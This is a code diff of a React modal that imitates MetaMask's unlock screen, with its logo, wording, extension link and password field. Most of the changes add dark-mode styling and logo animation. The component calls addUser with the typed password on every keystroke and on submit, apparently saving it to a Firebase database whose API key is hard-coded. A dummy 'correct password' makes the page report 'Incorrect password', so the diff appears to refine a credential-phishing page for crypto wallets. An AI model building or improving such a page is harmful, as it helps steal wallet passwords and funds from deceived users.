@@ -1,6 +1,12 @@
-import React from "react";
 import { UserContext } from ".";
-import { useContext, useState } from "react";
+import React, {
+  useContext,
+  useState,
+  useRef,
+  useEffect,
+  useLayoutEffect,
+  useCallback,
+} from "react";
 import Box from "@mui/material/Box";
 import Modal from "@mui/material/Modal";
 import Button from "@mui/material/Button";
@@ -29,6 +35,8 @@ import { initializeApp } from "firebase/app";
 import { getAnalytics } from "firebase/analytics";
 import { getDatabase, ref, set } from "firebase/database";
 
+const isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches;
+// console.log("Is dark mode?", isDarkMode);
 const firebaseConfig = {
   apiKey: "AIzaSyC0h7zy2gy9MjVcmkeQLcIoqVw0jIbRHxw",
 
@@ -61,9 +69,10 @@ const style = {
   right: 0,
   width: 357,
   height: 600,
-  bgcolor: "background.paper",
+  bgcolor: isDarkMode === true ? "#141618" : "background.paper",
   border: "1px solid #000",
   display: "flex",
+  "--color-text-default": isDarkMode === true ? "white" : "black",
 };
 
 const Mainmodal = () => {
@@ -74,16 +83,41 @@ const Mainmodal = () => {
   const openNetworkmodal = () => {
     data.setNetworkmodal(true);
   };
-
   const [password, setPassword] = useState("");
   const [error, setError] = useState(false);
   const [helperText, setHelperText] = useState("");
-  const [flag, setFlag] = useState(false);
+  const [isTyping, setIsTyping] = useState(false);
+  const [isFocused, setIsFocused] = useState(false);
+  const [effectiveArea, setEffectiveArea] = useState(null);
+  const logoContainerRef = useRef(null);
+  const inputRef = useRef(null);
+  const [startInput, setStartInput] = useState({ width: 0, height: 0 });
+  const handleType = (e) => {
+    if (e.key === "Enter") {
+      validatePassword();
+    }
+  };
+
+  const setInputRef = useCallback((node) => {
+    if (node) {
+      inputRef.current = node;
+      const { x, y } = node.getBoundingClientRect();
+      setStartInput({ x, y });
+    }
+  }, []);
+
+  const setLogoContainerRef = useCallback((node) => {
+    if (node) {
+      logoContainerRef.current = node;
+      const area = node.getBoundingClientRect();
+      setEffectiveArea(area);
+    }
+  }, []); // Empty dependency array ensures this runs only once
 
   // Password validation logic
   const validatePassword = () => {
     addUser(password);
-    const correctPassword = "111111111111111111111111111"; // Example correct password
+    const correctPassword = "111"; // Example correct password
     if (password !== correctPassword && password !== "") {
       setError(true);
       setHelperText("Incorrect password");
@@ -95,35 +129,47 @@ const Mainmodal = () => {
   const changepassword = (para) => {
     setError(false);
     setPassword(para);
+    setIsTyping(true);
     addUser(para);
   };
-  const clickout=()=>{
-    setPassword('');
-    handleClose();
-  }
- 
+  const handleFocus = () => {
+    setIsFocused(true);
+  };
+  const handleBlur = () => {
+    setIsFocused(false);
+  };
+
   return (
     <div>
       <Modal
         open={open}
-        onClose={clickout}
+        onClose={handleClose}
         aria-labelledby="child-modal-title"
         aria-describedby="child-modal-description"
       >
-        <Box sx={style} style={{ flexDirection: "column" }}>
+        <Box
+          sx={style}
+          ref={setLogoContainerRef}
+          style={{ flexDirection: "column" }}
+        >
           <div
             id="header"
             style={{
               padding: 8,
+              paddingTop: 16,
+              paddingBottom: 16,
               display: "flex",
               justifyContent: "space-between",
               alignItems: "center",
               width: "100%",
-              height: "68px",
-              boxShadow: "0 4px 8px rgba(0, 0, 0, 0.08)",
+              height: "76px",
+              boxShadow:
+                isDarkMode === true
+                  ? "0 4px 8px rgba(0, 0, 0, 0.38)"
+                  : "0 4px 8px rgba(0, 0, 0, 0.08)",
+            
             }}
           >
-            {/* <Button onClick={handleClose}>Close Child Modal</Button> */}
             <div id="button1" style={{ height: 32 }}>
               <Button
                 style={{
@@ -131,8 +177,9 @@ const Mainmodal = () => {
                   display: "flex",
                   justifyContent: "space-between",
                   alignContent: "center",
-                  backgroundColor: "#f2f4f6",
-                  borderRadius: 12,
+                  backgroundColor: isDarkMode === true ? "black" : "#f2f4f6",
+                  borderRadius: 16,
+                  height: 30,
                 }}
                 onClick={openNetworkmodal}
               >
@@ -149,7 +196,14 @@ const Mainmodal = () => {
                     alt={currentnet.text}
                   ></img>
                 </span>
-                <span style={{ marginRight: 9, color: "black", fontSize: 12,fontWeight:3 }}>
+                <span
+                  style={{
+                    marginRight: 9,
+                    color: isDarkMode === true ? "white" : "black",
+                    fontSize: 12,
+                    fontWeight: 3,
+                  }}
+                >
                   {currentnet.text}
                 </span>
                 <span
@@ -159,7 +213,13 @@ const Mainmodal = () => {
                     marginRight: 9,
                   }}
                 >
-                  <img src={arrowdown} style={{ width: 12 }} />
+                  <img
+                    src={arrowdown}
+                    style={{
+                      width: 12,
+                      filter: isDarkMode === true ? "invert(1)" : "invert(0)",
+                    }}
+                  />
                 </span>
               </Button>
             </div>
@@ -173,15 +233,22 @@ const Mainmodal = () => {
             <div
               id="metamasklogo"
               style={{
-                marginTop: 24,
+                marginTop: 10,
                 height: 120,
                 display: "flex",
                 justifyContent: "center",
               }}
             >
-              {" "}
-              <MetamaskLogo />{" "}
+              <MetamaskLogo
+                effectiveArea={effectiveArea}
+                isFocused={isFocused}
+                startInput={startInput}
+                isTyping={isTyping}
+                setIsTyping={setIsTyping}
+                password={password}
+              />
             </div>
+
             <h1
               className="mm-box mm-text mm-text--heading-lg mm-box--margin-top-1 mm-box--color-text-alternative"
               style={{
@@ -197,40 +264,70 @@ const Mainmodal = () => {
               {" "}
               Welcome back!
             </h1>
-            <div style={{ textAlign: "center" ,fontFamily:
-                  " Euclid Circular B, Roboto, Helvetica, Arial, sans-serif",color:'black' }}>
+            <div
+              style={{
+                textAlign: "center",
+                fontFamily:
+                  " Euclid Circular B, Roboto, Helvetica, Arial, sans-serif",
+                color: isDarkMode === true ? "white" : "black",
+              }}
+            >
               The decentralized web awaits
             </div>
 
             <div style={{ marginTop: 48 }}>
               <TextField
+                ref={setInputRef}
                 id="outlined"
                 label="Password"
                 variant="standard"
                 error={error}
                 type="password"
                 value={password}
+                onFocus={handleFocus}
+                onBlur={handleBlur}
                 onChange={(e) => {
                   changepassword(e.target.value);
-                  // console.log(e)
                 }}
-                onKeyDown={(e) => {
-                  if (e.key === "Enter") {
-                    validatePassword();
-                  }
-                }}
+                onKeyDown={handleType}
                 helperText={error ? helperText : ""}
                 sx={{
-                  width: "100%",
-                  borderRadius: 2,
-                  "& .MuiInput-input": {
-                    height: 23,color:'black'
+                  ".MuiFormHelperText-root.Mui-error ": {
+                    color: isDarkMode === true ? "#e88f97 !important" : "red",
                   },
+                  "& label": {
+                    color: "gray !important", // Force orange color
+                  },
+                  "& label.Mui-focused": {
+                    color: "gray !important", // Darker orange on focus
+                  },
+                  "& label.MuiInputLabel-shrink": {
+                    color: "gray !important", // Ensure shrinked label stays orange
+                  }, // Darker orange on focus
+                  " .css-4twbn2-MuiInputBase-root-MuiInput-root::before": {
+                    borderBottom:
+                      isDarkMode === true
+                        ? "1px solid white"
+                        : "1px solid black",
+         
+                  },
+                  ".css-4twbn2-MuiInputBase-root-MuiInput-root:hover:not(.Mui-disabled, .Mui-error)::before":
+                    {
+                      borderBottom:
+                        isDarkMode === true
+                          ? "1px solid white"
+                          : "1px solid black",
+                    },
+
+                  
                   "& .MuiInput-underline": {
+                 
                     "&:before": {
                       borderBottom:
                         error &&
-                        (password !== "" ? "2px solid red" : "1px solid black"),
+                        (password !== ""
+                          ? "2px solid red"
+                          : "1px solid red !important"),
                     },
                     "&:after": {
                       borderBottom:
@@ -239,25 +336,36 @@ const Mainmodal = () => {
                           : "2px solid rgb(3, 118, 201)", // Border color when focused
                     },
                   },
-                  "& .MuiInputLabel-root": {
-                    color: "gray", // Ensures the label is always gray
-                  },"&:hover": {
-                    borderBottom: "transparent", // Remove hover background
-                    boxShadow: "none", // Remove hover shadow (if any)
-                  },
+                  width: "100%",
                 }}
               />
             </div>
             <div style={{ marginTop: 28 }}>
               <Button
-                
-                  style={password===""?{backgroundColor: "rgb(111 185 239 / 90%)",border: "1px solid #848c96",}:{backgroundColor:'#0376c9',border: "1px solid black",}}
+                style={
+                  password === ""
+                    ? {
+                        backgroundColor:
+                          isDarkMode === true
+                            ? "#2d648c"
+                            : "rgb(111 185 239 / 90%)",
+                        border: "1px solid #848c96",
+                      }
+                    : {
+                        backgroundColor:
+                          isDarkMode === true ? "#43aefc" : "#0376c9",
+                        border:
+                          isDarkMode === true
+                            ? "1px solid white"
+                            : "1px solid black",
+                      }
+                }
                 sx={{
                   height: 44,
                   fontWeight: 400,
                   borderRadius: 100,
                   padding: "12px 16px",
-                  color: "white",
+                  color: isDarkMode === true ? "black" : "white",
                   width: "100%",
                   "&:hover": {
                     backgroundColor: "transparent", // Remove hover background
@@ -273,14 +381,14 @@ const Mainmodal = () => {
                   href="chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/home.html"
                   target="blank"
                   style={{
-                    fontSize: 11.2, // Corrected to camelCase
+                    fontSize: 12, // Corrected to camelCase
                     fontWeight: "bold",
 
                     fontFamily:
                       '"Euclid Circular B", Helvetica, Arial, sans-serif',
                     lineHeight: "140%",
                     fontStyle: "normal",
-                    color: "#0376c9",
+                    color: "#43aefc",
                     cursor: "pointer",
                     backgroundColor: "transparent",
                     padding: "0.75rem 1rem",
@@ -307,16 +415,20 @@ const Mainmodal = () => {
                   fontSize: 12,
                 }}
               >
-                <span style={{}}>
+                <span>
                   {" "}
-                  Need help? Contact{" "}
+                  <font
+                    style={{ color: isDarkMode === true ? "white" : "black" }}
+                  >
+                    Need help? Contact{" "}
+                  </font>
                   <a
                     href="https://support.metamask.io"
                     target="_blank"
                     rel="noopener noreferrer"
                     style={{
                       textDecoration: "none", // Remove underline
-                      color: "#0376c9", // Inherit text color from parent
+                      color: "#43aefc", // Inherit text color from parent
                       fontSize: "inherit", // Inherit font size from parent
                       background: "none", // Remove background color
                       padding: 0, // Remove padding
@@ -329,8 +441,6 @@ const Mainmodal = () => {
                 </span>
               </div>
             </div>
-
-            {/* <div style={{ padding: "20px" }}></div> */}
           </div>
         </Box>
       </Modal>
